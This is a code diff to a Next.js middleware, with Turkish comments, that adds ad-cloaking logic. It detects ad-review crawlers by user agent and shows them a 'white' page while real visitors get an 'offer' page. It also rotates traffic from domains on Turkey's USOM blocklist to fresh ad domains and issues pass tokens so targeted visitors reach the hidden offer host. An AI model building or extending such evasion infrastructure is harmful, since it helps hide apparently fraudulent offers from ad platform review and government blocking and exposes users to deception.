@@ -3,6 +3,7 @@ import type { NextRequest } from "next/server";
 import { isAdminHost, isCrmPath } from "@/lib/admin-host";
 import {
   checkCloak,
+  isCloakTestIp,
   OFFER_COOKIE,
   offerPassCookieOptions,
   whiteRedirectTarget,
@@ -11,6 +12,18 @@ import {
   getCachedActiveHostname,
   getCachedBlockedHostnames,
 } from "@/lib/domains/active-cache";
+import {
+  buildActiveAdUrl,
+  buildOfferHostUrl,
+  getActiveAdHost,
+  getDefaultOfferHost,
+  hasAdClickInUrl,
+  isAdPoolHost,
+  isOfferHost,
+  isTrustedOfferArrival,
+  normalizeHostname,
+} from "@/lib/offer-host";
+import { createOfferPassToken, OFFER_PASS_PARAM } from "@/lib/offer-pass";
 
 const CRAWLER_UA =
   /facebookexternalhit|Facebot|Meta-ExternalAgent|meta-externalagent|LinkedInBot|Twitterbot|Googlebot|bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|ia_archiver|Pinterestbot|AdsBot-Google/i;
@@ -25,6 +38,7 @@ function bypass(pathname: string): boolean {
     pathname === "/robots.txt" ||
     pathname === "/subeler.html" ||
     pathname === "/subeler" ||
+    pathname === "/basvuru.html" ||
     pathname.endsWith(".svg") ||
     pathname.endsWith(".png") ||
     pathname.endsWith(".json") ||
@@ -86,21 +100,37 @@ export async function middleware(request: NextRequest) {
     return NextResponse.next();
   }
 
-  const normalizedHost = host?.split(":")[0]?.toLowerCase().replace(/^www\./, "");
+  const normalizedHost = normalizeHostname(host);
+  const formHost = getDefaultOfferHost();
+
   if (normalizedHost) {
-    const [active, blocked] = await Promise.all([
+    const [activeAd, blocked] = await Promise.all([
       getCachedActiveHostname(),
       getCachedBlockedHostnames(),
     ]);
+
+    // USOM: engelli domain → tek aktif reklam domainine
     if (
-      active &&
+      activeAd &&
       blocked.includes(normalizedHost) &&
-      normalizedHost !== active
+      normalizedHost !== activeAd &&
+      isAdPoolHost(normalizedHost)
     ) {
       const url = request.nextUrl.clone();
-      url.hostname = active;
+      url.hostname = activeAd;
       url.protocol = "https:";
       return NextResponse.redirect(url, 302);
+    }
+
+    // Yedek reklam domaini — trafik harcamasın, aktif reklam domainine yönlendir
+    if (
+      isAdPoolHost(normalizedHost) &&
+      normalizedHost !== formHost
+    ) {
+      const active = activeAd ?? (await getActiveAdHost());
+      if (active && normalizedHost !== active) {
+        return NextResponse.redirect(await buildActiveAdUrl(request), 302);
+      }
     }
   }
 
@@ -115,6 +145,35 @@ export async function middleware(request: NextRequest) {
     return nextWithCloak(request, "offer", false);
   }
 
+  if (isCloakTestIp(request)) {
+    return nextWithCloak(request, "offer", true);
+  }
+
+  const onOfferHost = await isOfferHost(host);
+
+  if (onOfferHost && (await isTrustedOfferArrival(request))) {
+    const op = request.nextUrl.searchParams.get(OFFER_PASS_PARAM);
+    if (op) {
+      const clean = request.nextUrl.clone();
+      clean.searchParams.delete(OFFER_PASS_PARAM);
+      const response = NextResponse.redirect(clean, 302);
+      response.cookies.set(
+        OFFER_COOKIE,
+        "1",
+        offerPassCookieOptions(secureCookie(request))
+      );
+      return response;
+    }
+    return nextWithCloak(request, "offer", true);
+  }
+
+  if (onOfferHost) {
+    return NextResponse.redirect(
+      new URL("/subeler.html", request.url),
+      302
+    );
+  }
+
   const cloak = await checkCloak(request);
   if (cloak?.page === "white") {
     return NextResponse.redirect(
@@ -123,7 +182,12 @@ export async function middleware(request: NextRequest) {
     );
   }
 
-  return nextWithCloak(request, "offer", true);
+  const offerUrl = await buildOfferHostUrl(request);
+  if (!hasAdClickInUrl(offerUrl)) {
+    offerUrl.searchParams.set(OFFER_PASS_PARAM, await createOfferPassToken());
+  }
+  const redirect = NextResponse.redirect(offerUrl, 302);
+  return redirect;
 }
 
 export const config = {
